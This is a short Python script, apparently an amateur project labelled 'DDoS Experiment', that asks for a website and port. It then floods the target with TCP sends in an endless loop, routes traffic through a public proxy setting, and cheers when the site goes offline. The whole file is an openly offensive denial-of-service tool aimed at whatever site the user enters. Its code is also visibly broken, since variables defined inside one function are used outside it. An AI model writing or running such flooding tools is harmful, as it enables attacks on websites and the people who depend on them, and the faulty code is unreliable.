import socket
import time
import urllib.request

def send():
  packs = input("Input number of packets to be sent: ")
  proxy = "open.proxymesh.com:31280"

def webstatus(url):
    try:
        ip = socket.gethostbyname(url)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Set a timeout for the connection attempt
        result = sock.connect_ex((ip, 80))

        if result == 0:
            return True
        else:
            return False

        sock.close()
    except socket.error as e:
        print(f"An error occurred: {str(e)}")

def find_port(service_name):
    try:
        port = socket.getservbyname(service_name)
        return port
    except socket.error:
        return None

def send_packets(website, port, packs, proxy):
    try:
        proxy_handler = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
        opener = urllib.request.build_opener(proxy_handler)

        ip = socket.gethostbyname(website)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (ip, port)
        sock.connect(server_address)

        for _ in range(int(packs)):
            sock.sendall(b"Sorry, but your website is gonna be DDoS-ed")

        sock.close()

        if webstatus(website):
            print(f"Sent {packs} Packets to {website}, but it is still online.")
        else:
            print(f"Cool! The website '{website}' is closed or offline.")
            print("You just sent", packs, "Packets, WOW!")
            exit(0)
    except socket.error as e:
        print(f"An error occurred: {str(e)}")

# Example usage
print("DDoS Experiment by Scratch2033")
print("Powered by ChatGpt 4 (Free, poe)")
print("")

time.sleep(0.2)
website = input("Enter the website URL: ")
service = input("Network/Website protocol: ")
port = find_port(service)
print("Port is ", port)
if port == None:
 print("Invalid network protocol, Manual port insertion required.")
 port = int(input("Manual port needed: "))
 send()
else:
 send()
while True:
   send_packets(website, port, packs, proxy)
